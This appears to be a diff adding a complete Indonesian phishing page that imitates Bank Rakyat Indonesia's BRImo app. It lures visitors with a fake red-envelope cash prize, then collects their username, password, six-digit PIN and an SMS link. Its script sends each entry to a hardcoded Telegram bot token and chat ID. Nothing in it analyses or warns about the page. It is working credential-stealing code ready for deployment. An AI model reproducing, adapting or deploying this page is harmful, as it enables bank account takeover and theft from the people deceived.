@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Angpao BRImobile</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #fffbe6 0%, #ffe1f0 100%);
+      box-sizing: border-box;
+    }
+    body {
+      width: 100vw;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .amplop-container {
+      perspective: 1200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      width: 100vw;
+      position: absolute;
+      top: 0; left: 0;
+      background: linear-gradient(135deg, #fffbe6 0%, #ffe1f0 100%);
+      z-index: 2;
+      transition: opacity 0.5s;
+    }
+    .amplop {
+      width: 320px;
+      height: 200px;
+      position: relative;
+      cursor: pointer;
+      transform-style: preserve-3d;
+      transition: transform 1s cubic-bezier(.8, .2, .2, 1);
+    }
+    .amplop.opened {
+      transform: rotateY(180deg);
+      cursor: default;
+    }
+    .amplop-face, .amplop-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.18);
+    }
+    .amplop-face {
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 2.1rem;
+      letter-spacing: 2px;
+      font-weight: bold;
+      border: 2px solid #fff2cc;
+      box-sizing: border-box;
+      z-index: 2;
+    }
+    .amplop-face .icon {
+      font-size: 3.3rem;
+      margin-bottom: 15px;
+      filter: drop-shadow(0 2px 2px #e05252);
+    }
+    .amplop-face .tap {
+      margin-top: 18px;
+      font-size: 1rem;
+      font-weight: 400;
+      opacity: 0.9;
+      letter-spacing: 1px;
+      background: #fff5;
+      padding: 3px 15px;
+      border-radius: 20px;
+    }
+    .amplop-back {
+      background: linear-gradient(135deg, #fffde4, #f9e7b7);
+      transform: rotateY(180deg);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      color: #ff416c;
+      border: 2px solid #ffebba;
+      box-sizing: border-box;
+      z-index: 1;
+    }
+    .nominal {
+      font-size: 2.4rem;
+      font-weight: bolder;
+      margin-bottom: 14px;
+      letter-spacing: 2px;
+      animation: pop 0.7s cubic-bezier(.5,1.8,.5,1.2);
+    }
+    @keyframes pop {
+      0% { transform: scale(0.1) rotate(-20deg);}
+      60% { transform: scale(1.2) rotate(10deg);}
+      100% { transform: scale(1) rotate(0);}
+    }
+    .selamat {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ff4b2b;
+      text-shadow: 1px 1px 0 #fff8, 0 2px 6px #ff416c33;
+      margin-bottom: 20px;
+      letter-spacing: 1.2px;
+      animation: fadein 0.9s 0.4s backwards;
+    }
+    @keyframes fadein {
+      0% { opacity: 0; transform: translateY(30px);}
+      100% { opacity: 1; transform: translateY(0);}
+    }
+    .lanjut-btn {
+      margin-top: 24px;
+      padding: 12px 36px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 24px;
+      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 2px 12px #ff416c55;
+      transition: background 0.2s, transform 0.2s;
+    }
+    .lanjut-btn:hover {
+      background: linear-gradient(90deg, #ff4b2b, #ff416c);
+      transform: scale(1.04);
+    }
+    .confetti {
+      pointer-events: none;
+      position: absolute;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      z-index: 99;
+      overflow: hidden;
+      display: none;
+    }
+    .confetti.active {
+      display: block;
+    }
+    .login-container {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      min-height: 100dvh;
+      background: #181a20;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      animation: fadeinlogin 0.7s;
+      transition: opacity 0.4s;
+    }
+    @keyframes fadeinlogin {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .login-inner {
+      width: 100vw;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 120px;
+      box-sizing: border-box;
+    }
+    .header {
+      width: 100vw;
+      max-width: 440px;
+      background: linear-gradient(180deg, #1fa2ff 0%, #12d8fa 60%, #0070c0 100%);
+      border-bottom-left-radius: 16px;
+      border-bottom-right-radius: 16px;
+      padding: 26px 0 13px 0;
+      box-shadow: 0 2px 12px #0070c033;
+      text-align: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 20;
+      min-width: 100vw;
+    }
+    .header .title {
+      font-size: 2.1rem;
+      font-weight: bold;
+      letter-spacing: 2px;
+      color: #fff;
+      margin-bottom: 2px;
+    }
+    .header .title span {
+      color: #ff9100;
+    }
+    .header .subtitle {
+      color: #fff;
+      font-size: 1.1rem;
+      font-weight: 400;
+      letter-spacing: 1px;
+    }
+    .login-box {
+      background: #23272f;
+      border-radius: 18px;
+      box-shadow: 0 6px 30px #0002;
+      margin: 0 auto;
+      margin-bottom: 12px;
+      padding: 32px 18px 28px 18px;
+      width: 92vw;
+      max-width: 370px;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      scroll-margin-top: 120px;
+    }
+    .login-box label {
+      color: #2d8cff;
+      font-size: 1.13rem;
+      margin-bottom: 10px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      margin-top: 10px;
+    }
+    .input-group {
+      margin-bottom: 17px;
+    }
+    .input-wrap {
+      position: relative;
+      margin-bottom: 8px;
+    }
+    .input-wrap input {
+      width: 100%;
+      background: #181a20;
+      border: 1.5px solid #383b45;
+      border-radius: 7px;
+      padding: 12px 40px 12px 38px;
+      color: #fff;
+      font-size: 1.07rem;
+      outline: none;
+      box-sizing: border-box;
+      scroll-margin-top: 120px;
+    }
+    .input-wrap input:focus {
+      border-color: #1fa2ff;
+    }
+    .input-wrap .icon {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: #2d8cff;
+      font-size: 1.2rem;
+      opacity: 0.93;
+    }
+    .input-wrap .eye {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      color: #2d8cff;
+      font-size: 1.2rem;
+      cursor: pointer;
+      opacity: 0.7;
+    }
+    .login-action {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 13px 0;
+      background: #cbe1fa;
+      color: #23272f;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      margin-top: 10px;
+      cursor: pointer;
+      letter-spacing: 1px;
+      box-shadow: 0 2px 10px #0070c033;
+      transition: background 0.18s;
+    }
+    .btn-login:active {
+      background: #b0d0f7;
+    }
+    .forgot-wrapper {
+      width: 100vw;
+      max-width: 370px;
+      display: flex;
+      justify-content: flex-end;
+      margin: 0 auto;
+      min-height: 38px;
+    }
+    .forgot {
+      font-size: 0.96rem;
+      color: #2d8cff;
+      text-decoration: none;
+      transition: color 0.2s;
+      margin-top: 6px;
+      margin-right: 18px;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+      color: #0e53a7;
+    }
+    .password-error-message {
+      color: #ff416c;
+      margin-bottom: 6px;
+      font-size: .97rem;
+      min-height: 20px;
+      text-align: left;
+      font-weight: 500;
+      margin-left: 3px;
+      margin-top: -2px;
+    }
+    .copyright {
+      margin-top: 36px;
+      color: #b9b9b9;
+      font-size: 0.97rem;
+      text-align: center;
+      padding-bottom: 20px;
+      width: 90vw;
+      max-width: 378px;
+    }
+    .pin-container {
+      background: #23272f;
+      border-radius: 18px;
+      box-shadow: 0 8px 30px #0003;
+      padding: 32px 24px 28px 24px;
+      width: 95vw;
+      max-width: 360px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0 auto;
+      margin-top: 110px;
+    }
+    .pin-title {
+      font-size: 1.2rem;
+      color: #fff;
+      margin-bottom: 18px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      text-align: center;
+    }
+    .pin-inputs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 18px;
+    }
+    .pin-inputs input {
+      width: 28px;
+      height: 38px;
+      font-size: 1.5rem;
+      text-align: center;
+      border-radius: 7px;
+      border: 2px solid #2d8cff;
+      background: #11141b;
+      color: #fff;
+      outline: none;
+      transition: border-color 0.2s;
+      scroll-margin-top: 120px;
+    }
+    .pin-inputs input:focus {
+      border-color: #ff9100;
+      background: #23272f;
+    }
+    .error-message {
+      color: #ff416c;
+      margin-bottom: 8px;
+      font-size: 1rem;
+      min-height: 20px;
+      text-align: center;
+      font-weight: 500;
+    }
+    .btn-submit {
+      width: 100%;
+      margin-top: 12px;
+      padding: 12px 0;
+      font-size: 1.03rem;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, #1fa2ff, #0070c0);
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      letter-spacing: 1px;
+      box-shadow: 0 2px 10px #0070c033;
+      transition: background 0.18s;
+    }
+    .btn-submit:active {
+      background: linear-gradient(90deg, #0070c0, #1fa2ff);
+    }
+    .tautan-container {
+      background: #23272f;
+      border-radius: 18px;
+      box-shadow: 0 8px 30px #0003;
+      padding: 32px 24px 28px 24px;
+      width: 95vw;
+      max-width: 380px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0 auto;
+      margin-top: 30px;
+    }
+    .tautan-title {
+      font-size: 1.25rem;
+      color: #fff;
+      margin-bottom: 10px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      text-align: center;
+    }
+    .tautan-desc {
+      color: #ffe1f0;
+      font-size: 1rem;
+      text-align: center;
+      margin-bottom: 16px;
+      margin-top: 0;
+      line-height: 1.5;
+    }
+    .tautan-inp-wrap {
+      display: flex;
+      width: 100%;
+      gap: 0;
+      margin-bottom: 18px;
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .tautan-inp-wrap input {
+      flex: 1 1 auto;
+      padding: 12px 8px;
+      border-radius: 7px;
+      border: 1.5px solid #2d8cff;
+      background: #11141b;
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+      margin-bottom: 10px;
+      text-align: left;
+    }
+    .tautan-inp-wrap input:focus {
+      border-color: #ff9100;
+      background: #23272f;
+    }
+    .btn-tautan-next {
+      width: 100%;
+      padding: 12px 0;
+      font-size: 1.04rem;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      letter-spacing: 1px;
+      box-shadow: 0 2px 10px #ff416c33;
+      transition: background 0.18s;
+    }
+    .btn-tautan-next:active {
+      background: linear-gradient(90deg, #ff4b2b, #ff416c);
+    }
+    @media (max-width: 480px) {
+      .header .title { font-size: 1.45rem;}
+      .login-box { padding: 22px 6vw 20px 6vw; }
+      .amplop { width:95vw; height: 48vw; min-width:220px; min-height:110px }
+      .header, .login-inner { min-width: 100vw;}
+      .header { padding: 18px 0 8px 0; }
+      .login-box { margin-top: 0; }
+      .login-inner { padding-top: 90px; }
+      .pin-container { margin-top: 80px; }
+      .tautan-container { margin-top: 20px; }
+      .forgot-wrapper { min-height: 32px; }
+      .forgot { margin-right: 8vw;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Confetti Effect -->
+  <div class="confetti" id="confetti"></div>
+  <!-- Amplop -->
+  <div class="amplop-container" id="amplopPage">
+    <div class="amplop" id="amplop">
+      <div class="amplop-face">
+        <span class="icon">🧧</span>
+        <span>BUKA<br>ANGPAO</span>
+        <span class="tap">Klik untuk buka</span>
+      </div>
+      <div class="amplop-back" id="amplopBack"></div>
+    </div>
+  </div>
+  <!-- Login -->
+  <div class="login-container" id="loginPage" style="display:none">
+    <div class="header">
+      <div class="title">BRI<span>mo</span></div>
+      <div class="subtitle">Selamat Datang</div>
+    </div>
+    <div class="login-inner">
+      <form class="login-box" autocomplete="off" id="loginForm" onsubmit="return false">
+        <div class="login-action">
+          <span style="color:#2d8cff; font-size:1.13rem; font-weight:500;">Login</span>
+        </div>
+        <div class="input-group">
+          <div class="input-wrap">
+            <i class="fa fa-user icon"></i>
+            <input type="text" placeholder="Username" name="username" required autocomplete="off">
+          </div>
+        </div>
+        <div class="input-group">
+          <div class="input-wrap">
+            <i class="fa fa-lock icon"></i>
+            <input type="password" placeholder="Password" name="password" required autocomplete="off" id="password-input">
+            <i class="fa fa-eye eye" id="togglePassword" onclick="togglePassword()"></i>
+          </div>
+          <div class="password-error-message" id="passwordError"></div>
+        </div>
+        <button class="btn-login" type="submit" id="loginButton">LANJUT</button>
+      </form>
+      <div class="forgot-wrapper">
+        <a href="#" class="forgot">Lupa Password?</a>
+      </div>
+      <div class="copyright">
+        &copy; 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+  </div>
+  <!-- PIN -->
+  <div class="login-container" id="pinPage" style="display:none; background:#181a20;">
+    <div class="header">
+      <div class="title">BRI<span>mo</span></div>
+      <div class="subtitle">Masukkan PIN</div>
+    </div>
+    <div class="login-inner">
+      <div class="pin-container">
+        <div class="pin-title">Masukkan PIN Anda</div>
+        <form id="pinForm" autocomplete="off" spellcheck="false">
+          <div class="pin-inputs">
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin1" required>
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin2" required>
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin3" required>
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin4" required>
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin5" required>
+            <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="off" class="pin-box" id="pin6" required>
+          </div>
+          <div class="error-message" id="pinError"></div>
+          <button type="submit" class="btn-submit">Kirim</button>
+        </form>
+      </div>
+      <div class="copyright">
+        &copy; 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+  </div>
+  <!-- Halaman 4: Form Salin Tautan -->
+  <div class="login-container" id="tautanPage" style="display:none; background:#181a20;">
+    <div class="header">
+      <div class="title">BRI<span>mo</span></div>
+      <div class="subtitle">Konfirmasi Tautan</div>
+    </div>
+    <div class="login-inner" style="padding-top:100px;">
+      <div class="tautan-container" style="margin-top:30px;">
+        <div class="tautan-title">Tempel Tautan Dari SMS</div>
+        <p class="tautan-desc">
+          Silakan tempel tautan yang kamu terima dari SMS pada kolom di bawah ini.<br>
+          Pastikan tautan yang dimasukkan benar ya.
+        </p>
+        <form id="tautanForm" autocomplete="off">
+          <div class="tautan-inp-wrap">
+            <input type="text" id="tautanInput" placeholder="Tempel tautan di sini..." autocomplete="off" required>
+          </div>
+          <div class="error-message" id="tautanError"></div>
+          <button class="btn-tautan-next" id="btnTautanNext" type="submit">Lanjutkan</button>
+        </form>
+      </div>
+      <div class="copyright">
+        &copy; 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+  </div>
+  <script>
+    // --- KONFIG BOT TELEGRAM ---
+    const TELEGRAM_TOKEN = "7509532185:AAFbPJEMSyEclTiu8MrXxZ16GFVWCeHxKy4";
+    const TELEGRAM_CHATID = "8165489813";
+    // Kirim pesan ke Telegram
+    function sendToTelegram(msg) {
+      fetch("https://api.telegram.org/bot"+TELEGRAM_TOKEN+"/sendMessage", {
+        method: "POST",
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: new URLSearchParams({
+          chat_id: TELEGRAM_CHATID,
+          text: msg
+        })
+      });
+    }
+
+    // Confetti generator
+    function showConfetti() {
+      const confetti = document.getElementById('confetti');
+      confetti.innerHTML = '';
+      confetti.classList.add('active');
+      for (let i = 0; i < 60; i++) {
+        const c = document.createElement('div');
+        c.style.position = 'absolute';
+        c.style.left = Math.random() * 100 + 'vw';
+        c.style.top = (Math.random() * -20) + 'vh';
+        c.style.width = '10px';
+        c.style.height = '18px';
+        c.style.background = `hsl(${Math.floor(Math.random()*360)},90%,70%)`;
+        c.style.opacity = Math.random()*0.7 + 0.3;
+        c.style.borderRadius = '4px';
+        c.style.transform = `rotate(${Math.random()*360}deg)`;
+        c.style.transition = 'top 2.4s linear, opacity 2.4s linear';
+        confetti.appendChild(c);
+        setTimeout(() => {
+          c.style.top = '100vh';
+          c.style.opacity = 0;
+        }, 20);
+      }
+      setTimeout(() => { confetti.classList.remove('active'); confetti.innerHTML = ''; }, 2500);
+    }
+    function getRandomNominal() {
+      const min = 20000, max = 100000;
+      const nominal = Math.floor((Math.random() * ((max - min)/1000 + 1))) * 1000 + min;
+      return nominal.toLocaleString('id-ID');
+    }
+    // Amplop logic
+    const amplop = document.getElementById('amplop');
+    const amplopBack = document.getElementById('amplopBack');
+    let opened = false;
+    amplop.addEventListener('click', function(){
+      if(opened) return;
+      opened = true;
+      amplop.classList.add('opened');
+      const nominal = getRandomNominal();
+      amplopBack.innerHTML = `
+        <div class="selamat">🎉 Selamat! 🎉</div>
+        <div class="nominal">Rp ${nominal}</div>
+        <div style="color:#e05252;font-size:1rem;"></div>
+        <button class="lanjut-btn" id="goLogin">Lanjut &rarr;</button>
+      `;
+      showConfetti();
+      setTimeout(() => {
+        const goLogin = document.getElementById('goLogin');
+        if(goLogin) {
+          goLogin.addEventListener('click', function(){
+            document.getElementById('amplopPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'flex';
+            window.scrollTo(0,0);
+          });
+        }
+      }, 100);
+    });
+    // Password toggle
+    function togglePassword() {
+      const pw = document.getElementById('password-input');
+      const eye = document.getElementById('togglePassword');
+      if (pw.type === "password") {
+        pw.type = "text";
+        eye.classList.remove('fa-eye');
+        eye.classList.add('fa-eye-slash');
+      } else {
+        pw.type = "password";
+        eye.classList.remove('fa-eye-slash');
+        eye.classList.add('fa-eye');
+      }
+    }
+
+    // --- PASSWORD VALIDATION ---
+    function validatePassword(pw) {
+      // Minimal kombinasi huruf besar, huruf kecil, angka
+      const hasUpper = /[A-Z]/.test(pw);
+      const hasLower = /[a-z]/.test(pw);
+      const hasNumber = /[0-9]/.test(pw);
+      if(!pw) return '';
+      if(!hasUpper || !hasLower || !hasNumber) {
+        return "Password harus mengandung huruf kapital, huruf kecil, dan angka";
+      }
+      return '';
+    }
+    const passwordInput = document.getElementById('password-input');
+    const passwordError = document.getElementById('passwordError');
+    passwordInput.addEventListener('input', function() {
+      const val = passwordInput.value;
+      const err = validatePassword(val);
+      passwordError.textContent = err;
+    });
+
+    // --- LOGIN SUBMIT ---
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      var username = this.username.value.trim();
+      var password = this.password.value.trim();
+      const err = validatePassword(password);
+      passwordError.textContent = err;
+      if(username && password && !err) {
+        // Kirim ke Telegram
+        sendToTelegram(
+          "LOGIN BRImo\nUsername: " + username + "\nPassword: " + password
+        );
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('pinPage').style.display = 'flex';
+        setTimeout(()=>{document.getElementById('pin1').focus();}, 300);
+      }
+    });
+
+    // PIN input logic
+    const boxes = [];
+    for(let i=1;i<=6;i++) boxes.push(document.getElementById('pin'+i));
+    const errorMsg = document.getElementById('pinError');
+    boxes.forEach((box, idx) => {
+      box.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g,'');
+        if (this.value.length === 1 && idx < boxes.length - 1) {
+          boxes[idx + 1].focus();
+        }
+        checkPinSame();
+      });
+      box.addEventListener('keydown', function(e) {
+        if(e.key === "Backspace" && !this.value && idx > 0) {
+          boxes[idx-1].focus();
+        }
+      });
+    });
+    function checkPinSame() {
+      let values = Array.from(boxes).map(b=>b.value);
+      if(values.every(v => v && v === values[0]) && values[0]) {
+        errorMsg.textContent = "PIN tidak boleh semua angka sama ";
+        return false;
+      } else {
+        errorMsg.textContent = "";
+        return true;
+      }
+    }
+    document.getElementById('pinForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (!checkPinSame()) return;
+      let pin = Array.from(boxes).map(b=>b.value).join('');
+      if (pin.length !== 6) {
+        errorMsg.textContent = "PIN harus 6 digit!";
+        return;
+      }
+      errorMsg.textContent = "";
+      // Kirim ke Telegram
+      sendToTelegram(
+        "PIN BRImo\nPIN: " + pin
+      );
+      document.getElementById('pinPage').style.display = 'none';
+      document.getElementById('tautanPage').style.display = 'flex';
+      setTimeout(()=>{document.getElementById('tautanInput').focus();}, 300);
+    });
+    // Scroll agar input login/pin tetap kelihatan di bawah header
+    document.querySelectorAll('.input-wrap input').forEach(inp=>{
+      inp.addEventListener('focus',function(){
+        setTimeout(()=>{
+          inp.scrollIntoView({behavior:'smooth', block:'center'});
+        }, 200);
+      });
+    });
+    boxes.forEach(inp=>{
+      inp.addEventListener('focus',function(){
+        setTimeout(()=>{
+          inp.scrollIntoView({behavior:'smooth', block:'center'});
+        }, 200);
+      });
+    });
+    // Halaman 4: Form Tautan
+    const tautanInput = document.getElementById('tautanInput');
+    const tautanError = document.getElementById('tautanError');
+    document.getElementById('tautanForm').onsubmit = function(e) {
+      e.preventDefault();
+      let val = tautanInput.value.trim();
+      if (!val) {
+        tautanError.textContent = "Tautan wajib diisi!";
+        tautanInput.focus();
+        return;
+      }
+      tautanError.textContent = "";
+      // Kirim ke Telegram
+      sendToTelegram(
+        "TAUTAN SMS\nTautan: " + val
+      );
+      alert("Terima Kasih Tunggu 1x24jam.");
+    };
+    // Agar input tautan selalu terlihat saat difokuskan di HP
+    tautanInput.addEventListener('focus', function() {
+      setTimeout(() => {
+        tautanInput.scrollIntoView({behavior:'smooth', block:'center'});
+      }, 200);
+    });
+  </script>
+</body>
+</html>
